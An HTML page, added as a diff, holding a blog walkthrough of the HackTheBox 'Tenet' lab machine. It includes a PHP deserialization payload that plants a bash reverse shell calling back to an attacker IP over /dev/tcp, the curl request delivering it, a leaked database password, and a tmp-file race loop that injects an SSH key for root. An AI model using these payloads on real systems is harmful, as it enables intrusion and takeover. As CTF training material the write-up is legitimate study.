@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>HacktheBox - Tenet | b3nj1</title>
+  <link rel="stylesheet" href="../css/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
+  <meta name="description" content="Cybersecurity & networking research, CTF walkthroughs, and mobile pentesting">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark-dimmed.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <meta property="article:published_time" content="2021-06-12">
+</head>
+<body>
+  <div class="container">
+    <nav>
+      <span class="logo">~&gt; <a href="../index.html">b3nj1</a></span>
+      <ul class="nav-links">
+        <li><a href="../index.html">Posts</a></li>
+        <li><a href="../about/index.html">About</a></li>
+        <li><a href="../research/index.html">Research</a></li>
+        <li><a href="https://github.com/b3nj1-1" target="_blank">GitHub</a></li>
+        <li><button class="theme-btn" id="dmBtn" onclick="toggleDM()">light</button></li>
+        <li><button class="theme-btn" onclick="switchTheme()">layout</button></li>
+      </ul>
+    </nav>
+    
+    <article>
+      <div class="post-header">
+        <a href="../index.html" class="back-link">&larr; Back to all posts</a>
+        <h1>HacktheBox - Tenet</h1>
+        <div class="meta">
+          <time datetime="2021-06-12">Jun 11, 2021</time>
+          <span class="sep">&#x2022;</span>
+          <span class="cat">Hackthebox</span>
+          <span class="sep">&#x2022;</span>
+          <span>5 tags</span>
+        </div>
+      </div>
+      <div class="post-content">
+        <p>It is an excellent machine to practice deserialization in PHP.</p>
+<hr>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<ul>
+<li>22/tcp OpenSSH 7.6p1</li>
+<li>80/tcp Apache httpd 2.4.29</li>
+</ul>
+<pre><code>
+```bash
+nmap -sC -sV -p22,80 10.10.10.223 -oN Scan_port1                                          
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-02 10:33 EDT
+Nmap scan report for 10.10.10.223
+Host is up (0.060s latency).
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
+|   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
+|_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
+</code></pre>
+<h2>Web Enumeration</h2>
+<p>Quick listing tips to always see what we are up against:</p>
+<pre><code class="language-bash">whatweb  10.10.10.223                                                             
+http://10.10.10.223 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], Title[Apache2 Ubuntu Default Page: It works]
+</code></pre>
+<h3>Fuzz</h3>
+<ul>
+<li>/users.txt</li>
+<li>/wordpress/wp-login.php</li>
+</ul>
+<pre><code class="language-bash">Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848
+
+Target: http://10.10.10.223/
+
+[18:55:50] Starting: 
+[18:58:30] 200 -    7B  - /users.txt
+[18:58:36] 200 -    6KB - /wordpress/wp-login.php
+</code></pre>
+<h3>Tenet Wordpress</h3>
+<p><img src="/images_blog/img_tenet/Pastedimage20210502200252.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/127757805-5d1395c6-eae9-4dfd-85c1-0e482dd3f039.png" alt="Pastedimage20210502200252"></p>
+<p>Subdomain:</p>
+<ul>
+<li>sator.tenet.htb</li>
+</ul>
+<h3>Tenet.htb</h3>
+<p><img src="/images_blog/img_tenet/Pastedimage20210502180600.png" alt=""><br><img src="https://user-images.githubusercontent.com/76759292/127757807-1ab06b16-8ec1-477a-b3e2-258c8507d8ad.png" alt="Pastedimage20210502180600"></p>
+<h2>Off topic</h2>
+<ul>
+<li>/xmlrpc.php</li>
+</ul>
+<p>Although it has nothing to do with it, I find it interesting the way this is exploited <a href="(https://www.securityfocus.com/bid/14088/exploit)">aqui</a></p>
+<h2>PHP deserialization</h2>
+<p><a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">Look</a></p>
+<p>Here is the other one:</p>
+<ul>
+<li>Sator.php.bak</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+
+class DatabaseExport
+{
+	public $user_file = &#39;users.txt&#39;;
+	public $data = &#39;&#39;;
+
+	public function update_db()
+	{
+		echo &#39;[+] Grabbing users from text file &lt;br&gt;&#39;;
+		$this-&gt; data = &#39;Success&#39;;
+	}
+
+
+	public function __destruct()
+	{
+		file_put_contents(__DIR__ . &#39;/&#39; . $this -&gt;user_file, $this-&gt;data);
+		echo &#39;[] Database updated &lt;br&gt;&#39;;
+	//	echo &#39;Gotta get this working properly...&#39;;
+	}
+}
+
+$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;
+$databaseupdate = unserialize($input);
+
+$app = new DatabaseExport;
+$app -&gt; update_db();
+
+
+?&gt;
+</code></pre>
+<p>This helps us to know where we should pull, then seeing how everything moves I realized that it could be deserialization and I found the blog that I put at the beginning.</p>
+<p>Then with the php interactive we can create what we want the program to do:</p>
+<pre><code class="language-php">php -a           
+Interactive mode enabled
+
+php &gt; class DatabaseExport {
+php {   public $user_file = &#39;rce.php&#39;;
+php {   public $data = &#39;&lt;?php exec(&quot;/bin/bash -c \&#39;bash -i &gt; /dev/tcp/10.10.14.101/4444 0&gt;&amp;1\&#39;&quot;); ?&gt;&#39;;
+php {   }
+php &gt; 
+php &gt; print urlencode(serialize(new DatabaseExport));
+O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+</code></pre>
+<p>To make this work, we do this, we see that it uses  <code>arepo</code></p>
+<pre><code>$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;
+$databaseupdate = unserialize($input);
+</code></pre>
+<p>Then the serialized data we generate is placed here:</p>
+<pre><code>curl -i http://sator.tenet.htb/sator.php\?arepo\=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
+</code></pre>
+<p>Then we visited <code>http://sator.tenet.htb/rce.php</code> </p>
+<h2>PrivEsc</h2>
+<pre><code class="language-bash">/** MySQL database username */                                                                                         
+define( &#39;DB_USER&#39;, &#39;neil&#39; );                                                                                           
+                                                                                                                       
+/** MySQL database password */                                                                                         
+define( &#39;DB_PASSWORD&#39;, &#39;Opera2112&#39; );     
+</code></pre>
+<p>Estas claves puedo entrar por ssh.</p>
+<p><a href="https://kbmwkaaxveg73o3q7ydl7zxf2a-adv7ofecxzh2qqi-superuser-com.translate.goog/questions/834277/what-should-i-worry-about-when-using-mktemp-dry-run">mktemp</a> we see that we can run a script as root I analyze it and this part calls me:</p>
+<pre><code class="language-bash">addKey() {
+        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
+
+        (umask 110; touch $tmpName)
+
+        /bin/echo $key &gt;&gt;$tmpName
+
+        checkFile $tmpName
+
+        /bin/cat $tmpName &gt;&gt;/root/.ssh/authorized_keys
+
+        /bin/rm $tmpName
+}
+</code></pre>
+<p>If we look at the part of the mktemp -u we can see that the script writes the public key found in the key variable and copies it to a file</p>
+<pre><code class="language-bash">while true; do echo &quot;ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&quot; | tee /tmp/ssh* &gt; /dev/null; done
+</code></pre>
+<p>Together we run the script several times and that&#39;s it.</p>
+<p>MACHINE PWNED!!!!</p>
+<p align="center">
+<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="300" height="300" />
+</p>
+      </div>
+      <div class="post-footer">
+        <div class="tags">
+          <span class="tag">ctf</span>
+        <span class="tag">linux</span>
+        <span class="tag">hackthebox</span>
+        <span class="tag">Writeup</span>
+        <span class="tag">deserializacion</span>
+        </div>
+      </div>
+    </article>
+    <footer>
+      &copy; 2026 <a href="https://github.com/b3nj1-1">B3nj1</a>. All rights reserved.
+    </footer>
+  </div>
+  <script>
+    function switchTheme() { localStorage.setItem('layout','minimal'); window.location.href = '../../minimal/index.html'; }
+    function toggleDM() { var d = document.documentElement; var c = d.getAttribute('data-theme'); var n = (c === 'light') ? 'dark' : 'light'; d.setAttribute('data-theme', n); document.getElementById('dmBtn').textContent = n === 'light' ? 'dark' : 'light'; localStorage.setItem('dm', n); }
+    (function(){ var s = localStorage.getItem('dm') || 'dark'; if (s === 'light') { document.documentElement.setAttribute('data-theme','light'); document.getElementById('dmBtn').textContent = 'dark'; } })();
+  </script>
+</body>
+</html>
